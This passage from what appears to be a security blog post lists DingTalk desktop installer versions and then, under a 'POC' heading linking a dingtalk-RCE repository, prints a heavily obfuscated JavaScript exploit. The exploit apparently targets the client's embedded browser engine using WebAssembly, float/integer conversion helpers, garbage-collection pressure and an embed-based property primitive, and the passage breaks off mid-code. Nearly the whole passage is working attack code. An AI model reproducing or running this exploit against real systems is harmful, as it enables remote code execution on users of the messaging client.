ngtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.36.25.exe<br>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.36.29.exe<br>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.36.30.exe<br>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.36.31.exe<br>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.39.1.exe<br>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.39.5.exe<br>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.39.6.exe<br>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.39.9.exe<br>https://dtapp-pub.dingtalk.com/dingtalk-desktop/win_installer/Release/DingTalk_v5.1.39.10.exe<br></code></pre></td></tr></table></figure><h3 id="0x02-POC">0x02 POC</h3><p><a href="https://github.com/crazy0x70/dingtalk-RCE">https://github.com/crazy0x70/dingtalk-RCE</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span> test <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> _0x1b17=[<span class="hljs-string">&#x27;KELCi8OxLg==&#x27;</span>,<span class="hljs-string">&#x27;ZE/CpWvCpDkcPA==&#x27;</span>,<span class="hljs-string">&#x27;E8Kjw51bQ8O+Klk0w4vCsw==&#x27;</span>,<span class="hljs-string">&#x27;w5lnw5Ipwr12RsOCw7B/J8OEw4E=&#x27;</span>,<span class="hljs-string">&#x27;QMOtNcO9w77Dv8OIwp3DmQ7CksOdOA==&#x27;</span>,<span class="hljs-string">&#x27;X8KgbcK0wqXCuw==&#x27;</span>,<span class="hljs-string">&#x27;DjfCg8KK&#x27;</span>,<span class="hljs-string">&#x27;OsO3fsOwwojCq0YpMw==&#x27;</span>,<span class="hljs-string">&#x27;RMKWBMKHW3PCqcKjTwgMaw==&#x27;</span>,<span class="hljs-string">&#x27;O8KCw5PCoMOpwo0=&#x27;</span>,<span class="hljs-string">&#x27;e0rDgMO8wqNndsOM&#x27;</span>,<span class="hljs-string">&#x27;wphVw6Zhw7wWwrLDg8K1&#x27;</span>,<span class="hljs-string">&#x27;IibCvsKFwqXCqMKAw6w4NDgs&#x27;</span>,<span class="hljs-string">&#x27;PcO6Z8O2w4LCp20tMWrDhxMZRSLCmSvDuTjCnk8=&#x27;</span>,<span class="hljs-string">&#x27;GcOiPsKX&#x27;</span>,<span class="hljs-string">&#x27;G8K7w6vDpXNGIcOwLnXDu8K9BkI=&#x27;</span>,<span class="hljs-string">&#x27;w7MXFMKhw78WwpYqwqVVFcKR&#x27;</span>,<span class="hljs-string">&#x27;GMK/w7vDpnVIJ8Or&#x27;</span>,<span class="hljs-string">&#x27;ank7Wy4jw44=&#x27;</span>,<span class="hljs-string">&#x27;HTfCicKbGsKEaysJwqTDux1L&#x27;</span>,<span class="hljs-string">&#x27;GS3CqsKEwqjCp8KRw5Y=&#x27;</span>,<span class="hljs-string">&#x27;GcOmcktVwrw=&#x27;</span>,<span class="hljs-string">&#x27;w50aKsKuwq9cdMO4wpTDqyo5GBQ=&#x27;</span>,<span class="hljs-string">&#x27;IybCrcKgwrvCpsKGw5w8Pyc5AcOn&#x27;</span>,<span class="hljs-string">&#x27;NhbCuwM=&#x27;</span>,<span class="hljs-string">&#x27;wqFcbEfDmMOMw6LCkl9ywqwDwocc&#x27;</span>,<span class="hljs-string">&#x27;wqfChMOfw4jDjsKzwozCn8Oqwok=&#x27;</span>,<span class="hljs-string">&#x27;w4tcwrED&#x27;</span>,<span class="hljs-string">&#x27;cCvCsMOQw7g=&#x27;</span>,<span class="hljs-string">&#x27;w6pdw4k=&#x27;</span>,<span class="hljs-string">&#x27;wqJyw4vCmMO1wrTCj8OSwqnDnSY=&#x27;</span>,<span class="hljs-string">&#x27;WsKcBA==&#x27;</span>,<span class="hljs-string">&#x27;wrV8w4vCjcOlwrDDgcKXwqTDlQ==&#x27;</span>,<span class="hljs-string">&#x27;XsKWD8KeWA==&#x27;</span>,<span class="hljs-string">&#x27;H8O+KcKHHGPDiUQ=&#x27;</span>,<span class="hljs-string">&#x27;w73Ci8OFw60=&#x27;</span>,<span class="hljs-string">&#x27;Wy7Csg==&#x27;</span>,<span class="hljs-string">&#x27;e0TDocOvwrR6IsKLQArDsw==&#x27;</span>,<span class="hljs-string">&#x27;AzvCjQIS&#x27;</span>,<span class="hljs-string">&#x27;VMOxw6/Ciw==&#x27;</span>,<span class="hljs-string">&#x27;fEDDp8OdwrhgbMKYGw==&#x27;</span>,<span class="hljs-string">&#x27;PCzCvg==&#x27;</span>,<span class="hljs-string">&#x27;w5QHwrPDlGRLNQHDpHwqa8OJR3hiwpwyMBJzJR8=&#x27;</span>,<span class="hljs-string">&#x27;ZMO8ecOcd8Oow7M6wq1O&#x27;</span>,<span class="hljs-string">&#x27;w417wqvDl3BuwooiwrnCpDBZwoNw&#x27;</span>,<span class="hljs-string">&#x27;fHtRGA==&#x27;</span>,<span class="hljs-string">&#x27;Y24s&#x27;</span>,<span class="hljs-string">&#x27;w4VWwrsdKQ8=&#x27;</span>,<span class="hljs-string">&#x27;HsKCOC4RwrQ=&#x27;</span>,<span class="hljs-string">&#x27;w4AJwrLDi05SLxfDtEI0esODaA==&#x27;</span>,<span class="hljs-string">&#x27;L2kiFG0=&#x27;</span>,<span class="hljs-string">&#x27;H8O+I8KdBmc=&#x27;</span>,<span class="hljs-string">&#x27;w6RcwrEPMQI=&#x27;</span>,<span class="hljs-string">&#x27;FTvDq8O+w7Ucax4=&#x27;</span>,<span class="hljs-string">&#x27;FsKfJS4Rwrky&#x27;</span>,<span class="hljs-string">&#x27;wpBAw5zCjMO1&#x27;</span>,<span class="hljs-string">&#x27;HsO+w4PDgsKUWw==&#x27;</span>,<span class="hljs-string">&#x27;EcKxwoXDjcOLCQ==&#x27;</span>,<span class="hljs-string">&#x27;PkrCncOEOMOww7fCrlDCgMOJesOdAQ==&#x27;</span>,<span class="hljs-string">&#x27;F8K+w49bSQ==&#x27;</span>,<span class="hljs-string">&#x27;w4dew5rDmMKg&#x27;</span>,<span class="hljs-string">&#x27;wp52wrbCpzM=&#x27;</span>,<span class="hljs-string">&#x27;wqIjw4xDwqA=&#x27;</span>,<span class="hljs-string">&#x27;cMKIw5vCncKdJV/CoMK7RA==&#x27;</span>,<span class="hljs-string">&#x27;CiTCnsKdC8KV&#x27;</span>,<span class="hljs-string">&#x27;fXtHE8ObSBZqwp5G&#x27;</span>,<span class="hljs-string">&#x27;Fjd1EMOqw57CgcOd&#x27;</span>,<span class="hljs-string">&#x27;ZsOje8OLbMO8w4Q3wqAQwqU=&#x27;</span>,<span class="hljs-string">&#x27;C8Kxw63Dh3RZIcO6Pj4=&#x27;</span>,<span class="hljs-string">&#x27;w4rDj8O/&#x27;</span>,<span class="hljs-string">&#x27;ZU/Ctg==&#x27;</span>,<span class="hljs-string">&#x27;BcKyw55TcsO8HF8+w7jCtsKtEgo7w5LCigQ8&#x27;</span>,<span class="hljs-string">&#x27;w4ZdwrkVPAM=&#x27;</span>];(<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4285cf,_0x1b1736</span>)&#123;<span class="hljs-keyword">var</span> _0x1368bb=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x5a17b5</span>)&#123;<span class="hljs-keyword">while</span>(--_0x5a17b5)&#123;_0x4285cf[<span class="hljs-string">&#x27;push&#x27;</span>](_0x4285cf[<span class="hljs-string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="hljs-title function_">_0x1368bb</span>(++_0x1b1736);&#125;(_0x1b17,<span class="hljs-number">0x17b</span>));<span class="hljs-keyword">var</span> _0x1368=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x4285cf,_0x1b1736</span>)&#123;_0x4285cf=_0x4285cf-<span class="hljs-number">0x0</span>;<span class="hljs-keyword">var</span> _0x1368bb=_0x1b17[_0x4285cf];<span class="hljs-keyword">if</span>(_0x1368[<span class="hljs-string">&#x27;kUYGYC&#x27;</span>]===<span class="hljs-literal">undefined</span>)&#123;(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> _0x270725=<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> _0x2929b1;<span class="hljs-keyword">try</span>&#123;_0x2929b1=<span class="hljs-title class_">Function</span>(<span class="hljs-string">&#x27;return\x20(function()\x20&#x27;</span>+<span class="hljs-string">&#x27;&#123;&#125;.constructor(\x22return\x20this\x22)(\x20)&#x27;</span>+<span class="hljs-string">&#x27;);&#x27;</span>)();&#125;<span class="hljs-keyword">catch</span>(_0x1b9f87)&#123;_0x2929b1=<span class="hljs-variable language_">window</span>;&#125;<span class="hljs-keyword">return</span> _0x2929b1;&#125;;<span class="hljs-keyword">var</span> _0x1971fd=<span class="hljs-title function_">_0x270725</span>();<span class="hljs-keyword">var</span> _0x3ad59d=<span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#x27;</span>;_0x1971fd[<span class="hljs-string">&#x27;atob&#x27;</span>]||(_0x1971fd[<span class="hljs-string">&#x27;atob&#x27;</span>]=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x332690</span>)&#123;<span class="hljs-keyword">var</span> _0x352a1c=<span class="hljs-title class_">String</span>(_0x332690)[<span class="hljs-string">&#x27;replace&#x27;</span>](<span class="hljs-regexp">/=+$/</span>,<span class="hljs-string">&#x27;&#x27;</span>);<span class="hljs-keyword">var</span> _0x194774=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> _0x5d479b=<span class="hljs-number">0x0</span>,_0xde7a28,_0x1ef172,_0x26c98e=<span class="hljs-number">0x0</span>;_0x1ef172=_0x352a1c[<span class="hljs-string">&#x27;charAt&#x27;</span>](_0x26c98e++);~_0x1ef172&amp;&amp;(_0xde7a28=_0x5d479b%<span class="hljs-number">0x4</span>?_0xde7a28*<span class="hljs-number">0x40</span>+<span class="hljs-attr">_0x1ef172</span>:_0x1ef172,_0x5d479b++%<span class="hljs-number">0x4</span>)?_0x194774+=<span class="hljs-title class_">String</span>[<span class="hljs-string">&#x27;fromCharCode&#x27;</span>](<span class="hljs-number">0xff</span>&amp;_0xde7a28&gt;&gt;(-<span class="hljs-number">0x2</span>*_0x5d479b&amp;<span class="hljs-number">0x6</span>)):<span class="hljs-number">0x0</span>)&#123;_0x1ef172=_0x3ad59d[<span class="hljs-string">&#x27;indexOf&#x27;</span>](_0x1ef172);&#125;<span class="hljs-keyword">return</span> _0x194774;&#125;);&#125;());<span class="hljs-keyword">var</span> _0xa07d5c=<span class="hljs-keyword">function</span>(<span class="hljs-params">_0x5c13fe,_0x1ca04c</span>)&#123;<span class="hljs-keyword">var</span> _0x48ea63=[],_0x8f6b18=<span class="hljs-number">0x0</span>,_0x30c8e4,_0xb17e6=<span class="hljs-string">&#x27;&#x27;</span>,_0x53b898=<span class="hljs-string">&#x27;&#x27;</span>;_0x5c13fe=<span class="hljs-title function_">atob</span>(_0x5c13fe);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> _0x52b8af=<span class="hljs-number">0x0</span>,_0x1cd1ff=_0x5c13fe[<span class="hljs-string">&#x27;length&#x27;</span>];_0x52b8af&lt;_0x1cd1ff;_0x52b8af++)&#123;_0x53b898+=<span class="hljs-string">&#x27;%&#x27;</span>+(<span class="hljs-string">&#x27;00&#x27;</span>+_0x5c13fe[<span class="hljs-string">&#x27;charCodeAt&#x27;</span>](_0x52b8af)[<span class="hljs-string">&#x27;toString&#x27;</span>](<span class="hljs-number">0x10</span>))[<span class="hljs-string">&#x27;slice&#x27;</span>](-<span class="hljs-number">0x2</span>);&#125;_0x5c13fe=<span class="hljs-built_in">decodeURIComponent</span>(_0x53b898);<span class="hljs-keyword">var</span> _0x49825d;<span class="hljs-keyword">for</span>(_0x49825d=<span class="hljs-number">0x0</span>;_0x49825d&lt;<span class="hljs-number">0x100</span>;_0x49825d++)&#123;_0x48ea63[_0x49825d]=_0x49825d;&#125;<span class="hljs-keyword">for</span>(_0x49825d=<span class="hljs-number">0x0</span>;_0x49825d&lt;<span class="hljs-number">0x100</span>;_0x49825d++)&#123;_0x8f6b18=(_0x8f6b18+_0x48ea63[_0x49825d]+_0x1ca04c[<span class="hljs-string">&#x27;charCodeAt&#x27;</span>](_0x49825d%_0x1ca04c[<span class="hljs-string">&#x27;length&#x27;</span>]))%<span class="hljs-number">0x100</span>;_0x30c8e4=_0x48ea63[_0x49825d];_0x48ea63[_0x49825d]=_0x48ea63[_0x8f6b18];_0x48ea63[_0x8f6b18]=_0x30c8e4;&#125;_0x49825d=<span class="hljs-number">0x0</span>;_0x8f6b18=<span class="hljs-number">0x0</span>;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">var</span> _0x17f739=<span class="hljs-number">0x0</span>;_0x17f739&lt;_0x5c13fe[<span class="hljs-string">&#x27;length&#x27;</span>];_0x17f739++)&#123;_0x49825d=(_0x49825d+<span class="hljs-number">0x1</span>)%<span class="hljs-number">0x100</span>;_0x8f6b18=(_0x8f6b18+_0x48ea63[_0x49825d])%<span class="hljs-number">0x100</span>;_0x30c8e4=_0x48ea63[_0x49825d];_0x48ea63[_0x49825d]=_0x48ea63[_0x8f6b18];_0x48ea63[_0x8f6b18]=_0x30c8e4;_0xb17e6+=<span class="hljs-title class_">String</span>[<span class="hljs-string">&#x27;fromCharCode&#x27;</span>](_0x5c13fe[<span class="hljs-string">&#x27;charCodeAt&#x27;</span>](_0x17f739)^_0x48ea63[(_0x48ea63[_0x49825d]+_0x48ea63[_0x8f6b18])%<span class="hljs-number">0x100</span>]);&#125;<span class="hljs-keyword">return</span> _0xb17e6;&#125;;_0x1368[<span class="hljs-string">&#x27;SGqjCq&#x27;</span>]=_0xa07d5c;_0x1368[<span class="hljs-string">&#x27;PalevQ&#x27;</span>]=&#123;&#125;;_0x1368[<span class="hljs-string">&#x27;kUYGYC&#x27;</span>]=!![];&#125;<span class="hljs-keyword">var</span> _0x5a17b5=_0x1368[<span class="hljs-string">&#x27;PalevQ&#x27;</span>][_0x4285cf];<span class="hljs-keyword">if</span>(_0x5a17b5===<span class="hljs-literal">undefined</span>)&#123;<span class="hljs-keyword">if</span>(_0x1368[<span class="hljs-string">&#x27;FXcKZO&#x27;</span>]===<span class="hljs-literal">undefined</span>)&#123;_0x1368[<span class="hljs-string">&#x27;FXcKZO&#x27;</span>]=!![];&#125;_0x1368bb=_0x1368[<span class="hljs-string">&#x27;SGqjCq&#x27;</span>](_0x1368bb,_0x1b1736);_0x1368[<span class="hljs-string">&#x27;PalevQ&#x27;</span>][_0x4285cf]=_0x1368bb;&#125;<span class="hljs-keyword">else</span>&#123;_0x1368bb=_0x5a17b5;&#125;<span class="hljs-keyword">return</span> _0x1368bb;&#125;;<span class="hljs-keyword">const</span> max_size=<span class="hljs-number">0x2710</span>;<span class="hljs-keyword">const</span> buf=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x8</span>);<span class="hljs-keyword">const</span> f64=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Float64Array</span>(buf);<span class="hljs-keyword">const</span> u32=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(buf);<span class="hljs-keyword">function</span> <span class="hljs-title function_">f2i</span>(<span class="hljs-params">_0x5ba462</span>)&#123;f64[<span class="hljs-number">0x0</span>]=_0x5ba462;<span class="hljs-keyword">let</span> _0x3b54a5=<span class="hljs-title class_">Array</span>[<span class="hljs-string">&#x27;from&#x27;</span>](u32);<span class="hljs-keyword">return</span> _0x3b54a5[<span class="hljs-number">0x1</span>]*<span class="hljs-number">0x100000000</span>+_0x3b54a5[<span class="hljs-number">0x0</span>];&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">i2f</span>(<span class="hljs-params">_0x2f58b4</span>)&#123;<span class="hljs-keyword">let</span> _0x8b3c4c=[];_0x8b3c4c[<span class="hljs-number">0x0</span>]=<span class="hljs-built_in">parseInt</span>(_0x2f58b4%<span class="hljs-number">0x100000000</span>);_0x8b3c4c[<span class="hljs-number">0x1</span>]=<span class="hljs-built_in">parseInt</span>((_0x2f58b4-_0x8b3c4c[<span class="hljs-number">0x0</span>])/<span class="hljs-number">0x100000000</span>);u32[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x38&#x27;</span>,<span class="hljs-string">&#x27;XQdw&#x27;</span>)](_0x8b3c4c);<span class="hljs-keyword">return</span> f64[<span class="hljs-number">0x0</span>];&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">d2u</span>(<span class="hljs-params">_0x9ff56e</span>)&#123;f64[<span class="hljs-number">0x0</span>]=_0x9ff56e;<span class="hljs-keyword">let</span> _0x47fd50=<span class="hljs-title class_">Array</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0xa&#x27;</span>,<span class="hljs-string">&#x27;7rtu&#x27;</span>)](u32);<span class="hljs-keyword">return</span> _0x47fd50;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">u2d</span>(<span class="hljs-params">_0x535342,_0x2feac9</span>)&#123;u32[<span class="hljs-number">0x0</span>]=_0x535342;u32[<span class="hljs-number">0x1</span>]=_0x2feac9;<span class="hljs-keyword">return</span> f64[<span class="hljs-number">0x0</span>];&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">print</span>(<span class="hljs-params">_0x510c7e</span>)&#123;<span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x29&#x27;</span>,<span class="hljs-string">&#x27;1027&#x27;</span>)](<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x16&#x27;</span>,<span class="hljs-string">&#x27;pndm&#x27;</span>)+_0x510c7e+<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x19&#x27;</span>,<span class="hljs-string">&#x27;@XkD&#x27;</span>));&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">hex</span>(<span class="hljs-params">_0x2abe47</span>)&#123;<span class="hljs-keyword">return</span> _0x2abe47[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x45&#x27;</span>,<span class="hljs-string">&#x27;Ob1V&#x27;</span>)](<span class="hljs-number">0x10</span>)[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x3&#x27;</span>,<span class="hljs-string">&#x27;@XkD&#x27;</span>)](<span class="hljs-number">0x10</span>,<span class="hljs-string">&#x27;0&#x27;</span>);&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">success_value</span>(<span class="hljs-params">_0x140a70,_0x2c5308</span>)&#123;<span class="hljs-variable language_">console</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x11&#x27;</span>,<span class="hljs-string">&#x27;THAJ&#x27;</span>)](<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x15&#x27;</span>,<span class="hljs-string">&#x27;ki5k&#x27;</span>)+_0x140a70+<span class="hljs-title function_">hex</span>(_0x2c5308));&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">wasm_func</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">var</span> _0x1ab208=&#123;<span class="hljs-string">&#x27;env&#x27;</span>:&#123;<span class="hljs-string">&#x27;puts&#x27;</span>:<span class="hljs-keyword">function</span> <span class="hljs-title function_">_0x36676a</span>(<span class="hljs-params">_0x4b8a69</span>)&#123;<span class="hljs-variable language_">console</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x1b&#x27;</span>,<span class="hljs-string">&#x27;*I%3&#x27;</span>)](_0x4b8a69);&#125;&#125;&#125;;<span class="hljs-keyword">var</span> _0x364582=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>([<span class="hljs-number">0x0</span>,<span class="hljs-number">0x61</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x89</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x7f</span>,<span class="hljs-number">0x60</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x8c</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6e</span>,<span class="hljs-number">0x76</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x75</span>,<span class="hljs-number">0x74</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0x82</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x84</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x81</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x7</span>,<span class="hljs-number">0x92</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6d</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x79</span>,<span class="hljs-number">0x2</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x5</span>,<span class="hljs-number">0x68</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x8d</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x92</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0xc</span>,<span class="hljs-number">0x48</span>,<span class="hljs-number">0x65</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x57</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x72</span>,<span class="hljs-number">0x6c</span>,<span class="hljs-number">0x64</span>,<span class="hljs-number">0x0</span>]);<span class="hljs-keyword">let</span> _0x17d97a=<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>[(<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x6&#x27;</span>,<span class="hljs-string">&#x27;*I%3&#x27;</span>))](<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebAssembly</span>[(<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x26&#x27;</span>,<span class="hljs-string">&#x27;h0rH&#x27;</span>))](_0x364582),_0x1ab208);<span class="hljs-keyword">let</span> _0x4137b4=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(_0x17d97a[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x28&#x27;</span>,<span class="hljs-string">&#x27;U7m4&#x27;</span>)][<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x22&#x27;</span>,<span class="hljs-string">&#x27;U7m4&#x27;</span>)][<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x2a&#x27;</span>,<span class="hljs-string">&#x27;CQJJ&#x27;</span>)]);<span class="hljs-keyword">return</span> _0x17d97a[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x4&#x27;</span>,<span class="hljs-string">&#x27;qxzt&#x27;</span>)][<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x13&#x27;</span>,<span class="hljs-string">&#x27;THAJ&#x27;</span>)];&#125;func=<span class="hljs-title function_">wasm_func</span>();<span class="hljs-keyword">function</span> <span class="hljs-title function_">gc</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> _0x636073=<span class="hljs-number">0x0</span>;_0x636073&lt;<span class="hljs-number">0x10</span>;_0x636073++)&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">0x1000000</span>);&#125;&#125;<span class="hljs-keyword">function</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> _0x1aae5c=<span class="hljs-number">0x0</span>;_0x1aae5c&lt;<span class="hljs-number">0x10000</span>;_0x1aae5c++)&#123;<span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> _0x206767=<span class="hljs-number">0x0</span>;_0x206767&lt;<span class="hljs-number">0x20000</span>;_0x206767++)&#123;<span class="hljs-keyword">var</span> _0x4e0be5=_0x4e0be5+_0x1aae5c+_0x206767;&#125;&#125;&#125;global_object=&#123;&#125;;setPropertyViaEmbed=<span class="hljs-function">(<span class="hljs-params">_0x704953,_0xabb024,_0x54136d</span>)=&gt;</span>&#123;<span class="hljs-keyword">const</span> _0x57fb88=<span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x5&#x27;</span>,<span class="hljs-string">&#x27;qlp^&#x27;</span>)](<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x3b&#x27;</span>,<span class="hljs-string">&#x27;e8CW&#x27;</span>));_0x57fb88[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x3a&#x27;</span>,<span class="hljs-string">&#x27;h0rH&#x27;</span>)]=_0x54136d;_0x57fb88[<span class="hljs-string">&#x27;type&#x27;</span>]=<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x46&#x27;</span>,<span class="hljs-string">&#x27;E5A6&#x27;</span>);<span class="hljs-title class_">Object</span>[<span class="hljs-string">&#x27;setPrototypeOf&#x27;</span>](global_object,_0x57fb88);<span class="hljs-variable language_">document</span>[<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x1f&#x27;</span>,<span class="hljs-string">&#x27;4nv[&#x27;</span>)][<span class="hljs-title function_">_0x1368</span>(<span class="hljs-string">&#x27;0x35&#x27;</span>,<span class="hljs-string">&#x27;ow9l&#x27;</span>)](_0x57fb88);_0x704953[<span class="hljs-title function_">_0x1368</span>(<span 